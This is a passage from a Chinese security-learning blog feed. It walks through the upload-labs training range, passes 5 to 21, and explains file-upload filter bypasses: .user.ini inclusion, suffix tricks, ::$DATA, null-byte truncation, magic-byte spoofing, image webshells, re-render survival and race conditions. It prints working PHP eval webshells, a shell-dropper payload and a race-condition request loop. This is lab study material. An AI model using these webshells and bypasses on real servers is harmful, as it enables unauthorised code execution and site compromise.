src="/../image/upload-pass05-2.png"></p><p><strong>.user.ini文件上传漏洞的前提：</strong></p><p>.user.ini可以生效并且该上传目录有php文件（比如这关后台的readme.php文件）</p><p><code>auto_prepend_file</code> 是 PHP 的一个配置选项，可以用来指定一个文件，在每个 <strong>PHP 脚本执行之前自动包含该文件的内容。这个文件会在 PHP 脚本的头部被包含执行，即在执行脚本之前会先执行这个文件。</strong></p><p>写法：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=mixbp.jpg<br></code></pre></td></tr></table></figure><p>构造mixbp.jpg文件，内含一句话木马，并且输出包含成功方便判断是否包含成功<br><img src="/../image/upload-pass05-3.png"></p><p>auto_prepend file为自动包含文件</p><p>.user.ini文件里写auto_prepend file&#x3D;mixbp.jpg （里面有一句话木马）</p><p><img src="/../image/upload-pass05-5.png"></p><p>然后就是先上传.ini文件，再上传jpg文件</p><p>然后通过访问服务器中的readme.php文件来实现auto_prepend_file功能<br>默认是要等待5分钟才能生效这里修改下配置文件，改成10秒</p><p><img src="/../image/upload-pass05-4.png"></p><p>上传完文件后访问readme.php</p><p><img src="/../image/upload-pass05-6.png"></p><p>包含成功，然后就能用蚁剑连接以下url</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">32.1</span><span class="hljs-regexp">/upload/u</span>pload/readme.php<br></code></pre></td></tr></table></figure><h3 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a><strong>点加空格加点绕过</strong></h3><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了</p><p>就是先上传php文件，然后抓包修改php格式为.php. .</p><p><img src="/../image/upload-pass05-7.png"></p><p><img src="/../image/upload-pass05-8.png"></p><p><img src="/../image/upload-pass05-9.png"></p><p>注意：这里由于末尾的.会自动去除，用蚁剑连接输入url的时候直接省去就行，但是好像不省去也行</p><h2 id="pass-06-大写绕过"><a href="#pass-06-大写绕过" class="headerlink" title="pass-06-大写绕过"></a>pass-06-大写绕过</h2><p>原理：在系统中文件后缀格式会自动解析成小写，所以可以用大写绕过，且这关的源码查看后发现没有将后缀改为小写</p><p>步骤：</p><ol><li>上传mixbp.php</li><li>抓包改写后缀为.Php（随便大写都行）</li><li>上传成功复制图片链接然后蚁剑连接</li></ol><p>这里会出现服务器错误，改成php+nginx就能成功连接了</p><h2 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass-07-空格绕过"></a>pass-07-空格绕过</h2><p>原理：在文件格式后加空格，windows系统在解析文件时会自动删掉空格，这关源码没有首尾去空格</p><p>步骤：</p><ol><li>上传mixbp.php</li><li>抓包改写后缀为.php    后面加几个空格</li><li>上传复制图片链接然后蚁剑连接</li></ol><h2 id="pass-08-后缀加点绕过"><a href="#pass-08-后缀加点绕过" class="headerlink" title="pass-08-后缀加点绕过"></a>pass-08-后缀加点绕过</h2><p>在后缀后面加点就完事了，其他和上面一样，原理也是后缀的点会自动去除</p><p>原理：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strrchr</span><span class="hljs-params">()</span></span> 函数（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，如果成功，返回该字符以及其后面的字符<br><br>比如mixbp<span class="hljs-selector-class">.php</span>.<br>因为没有去除末尾的点,源码会取到后缀就是最后那个点<br>而单个的.不在黑名单中<br></code></pre></td></tr></table></figure><h2 id="pass-09-DATA绕过"><a href="#pass-09-DATA绕过" class="headerlink" title="pass-09-$DATA绕过"></a>pass-09-$DATA绕过</h2><p>前置知识：额外数据流<br><img src="/../image/upload-pass09-1.png"></p><p>写入方法：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ada">在文件命令行里输入<br><br>echo 内容 &gt;&gt;文件名:额外数据流（可随便命名）<br><br><span class="hljs-keyword">type</span> <span class="hljs-type">文件名1&gt;&gt;文件名2:数据流名 </span>将文件名<span class="hljs-number">1</span>的内容写到文件名<span class="hljs-number">2</span>的额外数据流中<br><br>查看<br>notepad 文件名:额外数据流 用记事本来访问额外数据流<br></code></pre></td></tr></table></figure><p>例如：</p><p><img src="/../image/upload-pass09-2.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">这里的<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好&quot;</span> &gt;&gt;<span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>就是将<span class="hljs-string">&quot;你好&quot;</span>写入额外数据流nihao中<br>notepad <span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>就是用记事本访问额外数据流<br>注意：直接打开<span class="hljs-number">1</span>.txt是看不到额外数据流的<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">2.txt&gt;&gt;1.txt:study</span><br><span class="hljs-type"></span>将<span class="hljs-number">2</span>.txt的内容写到<span class="hljs-number">1</span>.txt的study额外数据流中<br></code></pre></td></tr></table></figure><p>原理：<strong>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名</strong> <strong>，且windows中的文件后缀不允许有::$DATA出现，所以自动解析后会去除，且这关代码确实少了去除字符串::$DATA</strong></p><p>抓包后修改后缀加上::$DATA</p><p><img src="/../image/upload-pass09-3.png"></p><p>注意：把后面添加的::$DATA删除才能连接成功</p><p><img src="/../image/upload-pass09-4.png"></p><h2 id="pass-10-点空格点绕过"><a href="#pass-10-点空格点绕过" class="headerlink" title="pass-10-点空格点绕过"></a>pass-10-点空格点绕过</h2><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了。而后缀经过后端处理后变为了.不再黑名单中也能绕过</p><p>步骤：</p><p>就是先上传php文件，然后抓包修改php后缀，后面加上. .</p><h2 id="pass-11-双写后缀绕过"><a href="#pass-11-双写后缀绕过" class="headerlink" title="pass-11-双写后缀绕过"></a>pass-11-双写后缀绕过</h2><p>查看源码发现多了个函数<br><img src="/../image/upload-pass11-1.png"></p><p>原理：这个函数会从左到右检查$file_name如果其中存在$deny_ext数组中（黑名单）的后缀，会被替换为空值””，但是只替换一次，所以只要将后缀改为.pphphp即可</p><p>步骤：</p><ol><li><p>抓包修改后缀</p><p><img src="/../image/upload-pass11-2.png"></p></li><li><p>蚁剑连接</p></li></ol><h2 id="pass-12-00截断"><a href="#pass-12-00截断" class="headerlink" title="pass-12-%00截断"></a>pass-12-%00截断</h2><p><strong>前置知识：空字符</strong><br>0x00在编程语言中使用</p><p>%00在url编码中使用</p><p>url编码j就是先将ascii码值转为16进制，然后再加%。</p><p>相当于字符串结束标志，后面的内容不会被解析</p><p>原理：这关源码采用白名单，最终文件存放位置使用拼接形式，使用%00截断，<code>需要php版本&lt;5.3.4</code>，并且<code>magic_quotes_gpc</code>关闭。</p><p>存放位置拼接</p><p><img src="/../image/upload-pass12-1.png"></p><p>从源码看出只要修改save_path然后用%00截断后面的路径就能让文件以php格式保存到指定路径</p><p>提交一个mixbp.jpg文件然后抓包，并修改save_path为..&#x2F;upload&#x2F;mixbp.php%00</p><p><img src="/../image/upload-pass12-2.png"></p><p>打开图片链接后发现出现not found错误</p><p><img src="/../image/upload-pass12-3.png"></p><p>这是因为真实的保存路径是截断符号之前的内容所以无法打开，将截断符后面的内容删去即可</p><p><img src="/../image/upload-pass12-4.png"></p><p>连接成功</p><h2 id="psss-13-0x00截断"><a href="#psss-13-0x00截断" class="headerlink" title="psss-13-0x00截断"></a>psss-13-0x00截断</h2><p>这关源码和上关差不多，只是上关是在get传参里修改url编码，这关是改post请求（这关的save_path是通过post请求得到）<br>最终文件存放位置使用拼接形式，所以可以使用0x00截断</p><p>注意：POST不会对里面的数据自动解码，需要在Hex中修改。</p><p>上传mixbp.jpg文件然后抓包后修改</p><p>在..&#x2F;upload&#x2F;后添加mixbp.php空格，加空格是为了后续的hex修改，加其他字符也可以（就是一个占位符方便修改）</p><p><img src="/../image/upload-pass13-1.png"></p><p>添加完之后选中空格然后修改code Hex为00，就是将占位符改为十六进制的00（注意不能直接写0x00）</p><p><img src="/../image/upload-pass13-2.png"></p><p>然后放包上传成功就能复制图片链接用蚁剑连接了，后面的步骤和上关一样</p><h2 id="pass-14-字节标识绕过"><a href="#pass-14-字节标识绕过" class="headerlink" title="pass-14-字节标识绕过"></a>pass-14-字节标识绕过</h2><p>前置知识：图片字节标识<br><img src="/../image/upload-pass14-1.png"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">字节是计算机中存储和传输数据的基本单位，通常表示为一个八位（<span class="hljs-number">8</span>-bit）的二进制数字序列。<span class="hljs-number">00000000</span><br><br>Utf<span class="hljs-number">-8</span>中，一个英文字符占一个字节，中文（含繁体字）占三个字节<br></code></pre></td></tr></table></figure><p>原理：查看源码发现这题会根据上传文件的前两个字节来判断文件格式，就是先将前两个字节从十六进制转换成十进制然后再白名单中比对。所以我们可以使用字节标识绕过</p><p>源码：</p><p><img src="/../image/upload-pass14-2.png"></p><p>例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">png</span>头两个字节为<span class="hljs-number">89</span> <span class="hljs-number">50</span>转换为十进制刚好是<span class="hljs-number">137</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>步骤：</p><p>这里我们如果直接将php改成png后缀，上传会不成功，因为源码会对文件的前两个字节验证，所以我们先在一句话木马前加上aa，然后前面就会多出两个61，我们将其改为89 50</p><p><img src="/../image/upload-pass14-3.png"></p><p>这里改完之后就能上传成功了，但是这里不会将我们上传的文件按php解析，用蚁剑会连接失败，所以我们要通过文件包含漏洞来运行，这会让我们上传的文件以php格式被解析</p><p><img src="/../image/upload-pass14-4.png"></p><p>点击文件包含按钮，出现代码，这里用GET传参来接收file文件</p><p><img src="/../image/upload-pass14-5.png"></p><p>在url中加入?file&#x3D;.&#x2F;upload&#x2F;3120250123211252.png，因为这个include.php在我们上传的文件的上级目录所以用.&#x2F;upload&#x2F;</p><p><img src="/../image/../image/upload-pass14-6.png"></p><p>然后就能用蚁剑连接了。</p><p>这关不改前两个字节也行，也能用图片马绕过</p><h2 id="pass-15-图片马绕过"><a href="#pass-15-图片马绕过" class="headerlink" title="pass-15-图片马绕过"></a>pass-15-图片马绕过</h2><p>前置知识：</p><p><img src="/../image/upload-pass15-1.png"></p><p><img src="/../image/upload-pass15-2.png"></p><p>原理：查看源码发现使用了getimagesize()函数和image_type_to_mime_type()函数，先将图像信息取出，然后将取出的图像类型常量值转换为MIME类型，从而验证文件类型。所以这里我们不能用字节标识绕过，但是可以用图片马绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy  <span class="hljs-number">111</span>.png/b+<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.png</span> 将<span class="hljs-number">1</span>.php中的内容拷进<span class="hljs-number">11</span>.png中并重新生成png文件<span class="hljs-selector-tag">a</span><br>注意：这里注意把图片写在前面，将一句话木马写在后面才能解析成功<br></code></pre></td></tr></table></figure><p>在这个命令中，<code>/b</code> 是一个参数，用于指示复制操作的模式。在 Windows 系统中，<code>/b</code> 参数用于指示 <code>copy</code> 命令执行二进制拷贝，即按字节进行拷贝，而不进行任何转换。</p><p>步骤：</p><p>将我们的php一句话木马拷进nailong.jpg中，最后生成出来一个hack.jpg图片里面就含有我们的一句话木马</p><p><img src="/../image/upload-pass15-3.png"></p><p>然后上传hack.jpg之后使用文件包含漏洞即可，步骤和前一关相同</p><h2 id="pass-16-图片马绕过"><a href="#pass-16-图片马绕过" class="headerlink" title="pass-16-图片马绕过"></a>pass-16-图片马绕过</h2><p>和上一关一样，只是源码稍微不一样</p><h2 id="pass-17-二次渲染绕过"><a href="#pass-17-二次渲染绕过" class="headerlink" title="pass-17-二次渲染绕过"></a>pass-17-二次渲染绕过</h2><p>查看源码发现这关检查了content-type和后缀，并且用imagecreatefromjpeg,imagecreatefrompng,imagecreatefromgif函数判断上传的是否为这三种类型的文件，并且使用了二次渲染，导致我们普通的图片马会被渲染，导致失效。</p><p>步骤：</p><p>这关好像只能用gif，因为gif渲染前后文件相同的部分较多，而另外两种类型比gif更脆弱且渲染前后相同区域少，这里上传我们正常的gif图片，上传成功后在浏览器中下载被渲染后的图片，然后使用010editor工具中的tools内的compare file功能比较我们上传之前的图片与渲染后的图片，这里我们就能找到蓝色区域（就是两张图片Hex没有变化的部分），插入我们的一句话木马，<code>&lt;?php @eval($_POST[&#39;mixbp&#39;]);?&gt;</code></p><p><strong>注意：这里插入一句话木马要用粘贴不能自己输入，否则会出问题，并且尽量在匹配区域靠后的位置插入</strong></p><p><img src="/../image/upload-pass17-1.png"></p><p>上传之后使用文件包含漏洞打开</p><p><img src="/../image/upload-pass17-2.png"></p><p>然后就是蚁剑连接，与前面几关一样</p><p>第二种方法：这关也可以先将图片上传然后下载渲染后的文件，然后直接在渲染后的文件内插入一句话木马，因为这里的源码不会对渲染之后的文件再渲染了</p><h2 id="pass-18-条件竞争原理与绕过"><a href="#pass-18-条件竞争原理与绕过" class="headerlink" title="pass-18-条件竞争原理与绕过"></a>pass-18-条件竞争原理与绕过</h2><p>前置知识：条件竞争</p><p>文件上传条件竞争前提：</p><p>服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除</p><p>文件上传条件竞争本质：</p><p>抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的</p><p><img src="/../image/upload-pass18-1.png"></p><p>源码分析：服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p><p>原理：如果这里有文件包含漏洞的话我们就能用前几关的图片马来绕过，但是这关没有，所以我们只能上传一个能够生成一句话木马的语句然后在这个语句被删除之前访问他（不能直接上传一句话木马访问，会被删除），利用burp多线程发包，然后不断在浏览器访问我们的shell，如果访问成功就会生成一句话木马</p><p><img src="/../image/upload-pass18-2.png"></p><p><img src="/../image/upload-pass18-3.png"></p><p>步骤：</p><p>上传11.php文件，内含<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#39;);?&gt;</code>，然后抓包</p><p><img src="/../image/upload-pass18-4.png"></p><p>把抓到的包放在intruder中设置攻击，清除payload$，这里选择null payloads然后选择无限重复，并在资源池内，将线程调到30，线程越高越容易访问到</p><p><img src="/../image/upload-pass18-5.png"></p><p>使用requests库构造一个python访问脚本，用来不断访问我们的11.php文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>url = <span class="hljs-string">&quot;http://192.168.32.1/upload/upload/11.php&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    html = requests.<span class="hljs-built_in">get</span>(url)<br>    <span class="hljs-keyword">if</span> html.status_code == 200:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>        break<br></code></pre></td></tr></table></figure><p>开始攻击并且运行python脚本，看到脚本输出ok，代表访问成功</p><p><img src="/../image/upload-pass18-7.png"></p><p>然后就能用蚁剑去连接我们的shell.php了，连接成功</p><p><img src="/../image/upload-pass18-8.png"></p><p>这里不使用python脚本也行，我们访问<a href="http://192.168.32.1/upload/upload/11.php%E8%B7%AF%E5%BE%84%E7%84%B6%E5%90%8E%E6%8A%93%E5%8F%96%E8%AE%BF%E9%97%AE%E5%8C%85%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E8%AE%BF%E9%97%AE%E5%8C%85%E8%AE%BE%E7%BD%AE%E6%94%BB%E5%87%BB%EF%BC%8C%E4%B9%9F%E6%98%AF%E9%80%89%E6%8B%A9null">http://192.168.32.1/upload/upload/11.php路径然后抓取访问包，然后将访问包设置攻击，也是选择null</a> payloads然后选择无限重复，调高线程成功访问概率会更大。然后就是先开启上传攻击，然后再访问攻击即可</p><h2 id="pass-19-apache解析漏洞-条件竞争"><a href="#pass-19-apache解析漏洞-条件竞争" class="headerlink" title="pass-19-apache解析漏洞+条件竞争"></a>pass-19-apache解析漏洞+条件竞争</h2><p>我们上传php文件，然后抓包改格式，源码会将我们的文件重命名为我们改的那个格式，又因为没有文件包含漏洞，不能将其以php格式解析，并且这里会先检查后缀，所以php文件还没有到服务器就被删掉了，所以这里不能用普通的条件竞争，要使用apache解析漏洞+条件竞争。</p><p>原理：apache不能解析.7z后缀名的文件，所以我们将11.php改为11.php.7z，这时apache会将其解析为11.php，从而实现绕过，然后这里我们的文件被转移到服务器后会被重命名，所以我们不断上传一个能生成一句话木马文件的小马，在被删除之前不断访问，即可得到shell</p><p>步骤：</p><p>将11.php文件上传然后抓包（内含<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["mixbp"])?>‘);?&gt;），然后修改后缀为11.php.7z</p><p><img src="/../image/upload-pass19-1.png"></p><p>然后就是不断的上传和访问（<a href="http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。">http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。</a></p><p><strong>注意：这关中，要实现多后缀解析漏洞需要在配置文件中修改配置 AddHandler application&#x2F;x-httpd-php .php</strong><br><strong>还有就是我这关不知道为什么重命名前我的文件变成了upload11.php.7z</strong></p><h2 id="pass-20-后缀绕过总结"><a href="#pass-20-后缀绕过总结" class="headerlink" title="pass-20-后缀绕过总结"></a>pass-20-后缀绕过总结</h2><p>源码分析：这关会将保存名称最后一个点之后的内容当做后缀名并验证，所以前面的所有后缀绕过都行，相当于前面后缀绕过的总结</p><p><img src="/../image/upload-pass20-1.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">这里各种后缀绕过都行<br>比如：<br>点绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.<br>点空格绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.空格<br>点空格点绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>. .<br>反斜杠upload-<span class="hljs-number">19</span>.php\.因为move_uploaded_file函数在move的时候会把\忽略掉<br>抓包后<span class="hljs-number">0</span>x00截断绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php0x00</span><span class="hljs-selector-class">.jpg</span>因为windows读到<span class="hljs-number">0</span>x00就会被截断<br>抓包后<span class="hljs-variable">$DATA</span>绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span><br></code></pre></td></tr></table></figure><h2 id="pass-21-审计-数组后缀绕过"><a href="#pass-21-审计-数组后缀绕过" class="headerlink" title="pass-21-审计+数组后缀绕过"></a>pass-21-审计+数组后缀绕过</h2><p>代码审计</p><p><img src="/../image/upload-pass21-1.png"></p><p>验证步骤</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1.</span>验证content-type是否为image/jpeg||image/png||image/gif<br><span class="hljs-number">2.</span>判断用POST发送的保存名称是否为空，如果为空<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用文件原名称，不为空就<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用保存名称<br><span class="hljs-number">3.</span>判断<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>是否为数组，如果不为数组就用explode()函数对<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>以<span class="hljs-string">&#x27;.&#x27;</span>来进行分割，使其变成数组<br><span class="hljs-number">4.</span>用end()函数取出<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>数组的最后一个元素，然后判断该后缀是否合法<br><span class="hljs-number">5.</span>用reset()函数取出数组第一位，然后与<span class="hljs-string">&#x27;.&#x27;</span>和<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>[count(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) - <span class="hljs-number">1</span>]进行拼接来生成保存文件名<span class="hljs-symbol">$</span>flie_name<br><span class="hljs-number">6.</span>使用move_uploaded_file()函数来将文件从临时目录转移到目标路径<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">explode</span><span class="hljs-params">(separator,string[,limit])</span></span> 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">(array)</span></span>函数，输出数组中的当前元素和最后一个元素的值。<br><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array)</span></span>函数，把数组的内部指针指向第一个元素，并返回这个元素的值<br><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">(array)</span></span>函数，计算数组中的单元数目，或对象中的属性个数<br></code></pre></td></tr></table></figure><p>原理：由于这里会将我们上传的保存名称分割为数组，但是我们直接发送数组，就可以绕过explode()，然后最后会将数组的第一位和第count($file)-1位进行拼接，所以我们只要保证数组第一位是1.php，然后第count($file-1)位为null即可拼接为1.php.在windows系统里会被自动删去后面的. 最后变为1.php，完成绕过</p><p>步骤：</p><p>上传我们的11.php（内含一句话木马）然后抓包，修改content-type为image&#x2F;jpeg||image&#x2F;png||image&#x2F;gif</p><p><img src="/../image/upload-pass21-2.png"></p><p>然后修改我们的POST的参数为save_name[0]，然后将save_name[0]的值改为1.php，然后复制POST请求，粘贴到下面改为save_name[2]，值改为jpg||png||gif，这样就会使$file[count($file)-1]&#x3D;$file[2-1]&#x3D;$file[1]&#x3D;null</p><p><img src="/../image/upload-pass21-3.png"></p><p>上传成功</p><p><img src="/../image/upload-pass21-4.png"></p><p>然后用蚁剑连接我们的一句话木马即可</p><h2 id="文件幻术头"><a href="#文件幻术头" class="headerlink" title="文件幻术头"></a>文件幻术头</h2><p>什么是文件幻术头<br>文件幻术头（也称为文件头、文件标识或魔术头）是文件的二进制数据中的一段特定字节序列，用于标识文件的类型或格式。它在文件的开头位置，并且通常是固定长度的。</p><h3 id="文件幻术头的主要作用"><a href="#文件幻术头的主要作用" class="headerlink" title="文件幻术头的主要作用"></a><strong>文件幻术头的主要作用</strong></h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1.文件类型识别：文件幻术头可以帮助程序或操作系统识别文件的类型。通过读取文件幻术头的特定字节序列，可以确定文件的实际类型，例如图片文件、音频文件、视频文件等。这对于文件处理软件和操作系统来说非常重要，因为它们需要根据文件的类型采取不同的处理方式。<br>2.文件完整性验证：文件幻术头还可以用于验证文件的完整性。某些文件格式的幻术头包含了文件的校验和或哈希值，可以用于检测文件是否被篡改或损坏。例如，压缩文件格式如ZIP和GZIP在文件头中包含了校验和，可以用于验证文件的完整性。<br>3.文件类型扩展名关联：文件幻术头通常与文件的扩展名（例如<span class="hljs-string">.jpg</span>、<span class="hljs-string">.png</span>、<span class="hljs-string">.bmp</span>等）关联。文件的扩展名通常用于表示文件类型，但它们可以被篡改或者不准确，而文件幻术头提供了一种更可靠的方式来确定文件的实际类型。这对于操作系统和文件管理工具来说非常重要，可以确保文件被正确地关联到相应的应用程序进行打开或处理。<br>4.绕过文件类型检查：某些服务器端对文件类型的检查可能仅仅是检查文件的扩展名而不是文件的内容。你可以尝试修改木马文件的内容，使其符合服务器端允许的文件类型的文件格式。例如，你可以通过在文件开头添加合法的文件头（如GIF的文件头）来绕过文件类型检查。<br></code></pre></td></tr></table></figure><h3 id="常见的图片文件格式文件幻术头"><a href="#常见的图片文件格式文件幻术头" class="headerlink" title="常见的图片文件格式文件幻术头"></a><strong>常见的图片文件格式文件幻术头</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span>文件（.jpg或.jpeg）的幻术头：FF D8 FF<br><span class="hljs-attribute">PNG</span>文件（.png）的幻术头：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A<br><span class="hljs-attribute">GIF</span>文件（.gif）的幻术头：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span> 或 <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">BMP</span>文件（.bmp）的幻术头：<span class="hljs-number">42</span> <span class="hljs-number">4</span>D<br><span class="hljs-attribute">TIFF</span>文件（.tif或.tiff）的幻术头：<span class="hljs-number">4</span>D <span class="hljs-number">4</span>D <span class="hljs-number">00</span> <span class="hljs-number">2</span>A 或 <span class="hljs-number">49</span> <span class="hljs-number">49</span> <span class="hljs-number">2</span>A <span class="hljs-number">00</span><br><span class="hljs-attribute">ICO</span>文件（.ico）的幻术头：<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">WebP</span>文件（.webp）的幻术头：<span class="hljs-number">52</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> xx xx xx xx <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">42</span> <span class="hljs-number">50</span>，其中 xx 是文件大小的字节序列<br></code></pre></td></tr></table></figure><p>注意这里的16进制文件幻术头是字符经过前端编码后得到的，例如GIF的47 49 46 38 39  61经过16进制转换为字符后就是GIF89a,而这个GIF89a可以直接放到木马脚本的前面，因为上传的时候前端回将其编码为47 49 46 38 39  61（这里再burp抓到的包可以看到hex）。而其他几种文件的幻术头解码为字符串放到木马脚本前面再传的时候还是不行（因为解码出来有些不是机器码所以复制的时候回乱码）这里可以直接去burp里面改16进制包（在不破坏包的情况下改木马前面的十六进制）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习笔记</title>
      <link href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019Http</title>
      <link href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"/>
      <url>/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/</url>
      
